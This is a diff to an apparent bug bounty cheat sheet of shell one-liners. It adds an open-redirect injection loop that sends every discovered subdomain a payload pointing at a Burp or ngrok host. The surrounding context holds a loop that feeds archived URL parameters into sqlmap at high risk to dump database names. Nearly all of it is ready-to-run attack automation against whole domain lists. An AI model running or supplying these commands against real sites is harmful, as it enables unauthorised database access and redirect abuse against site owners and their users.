@@ -92,6 +92,12 @@ echo scope.com | assetfinder -subs-only | waybackurls | grep 'wp-content' | http
 for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=*.$scope/*&output=text&fl=original&collapse=urlkey" | grep "?[a-z0-9]*=" | sed -e 's/:80//' | gf sqli | sqlmap --risk 3 --batch --dbs;done
 ```
 
+### Easy Open Redirect by endpoint injection
+
+```
+for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x//<BURP SUITE DOMAIN OR NGROK>/%2F.." | httpx -silent -follow-redirects;done
+```
+
 # Google Dorks:
 
 ### Confidential files
